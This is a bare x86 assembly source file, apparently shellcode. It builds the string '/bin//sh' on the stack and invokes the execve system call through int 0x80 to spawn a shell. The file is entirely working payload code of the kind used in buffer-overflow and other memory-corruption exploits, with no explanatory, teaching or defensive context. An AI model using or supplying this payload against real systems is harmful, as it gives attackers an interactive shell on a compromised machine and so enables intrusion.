.section .text
	.globl _start
_start:
  sub $200, %esp
  xor %eax, %eax
  push %eax

  push $0x68732f2f
  push $0x6e69622f
  mov  %esp, %ebx
  push %eax
  mov %esp, %edx
  push %ebx
  mov %esp, %ecx
  movb $11, %al
  int  $0x80
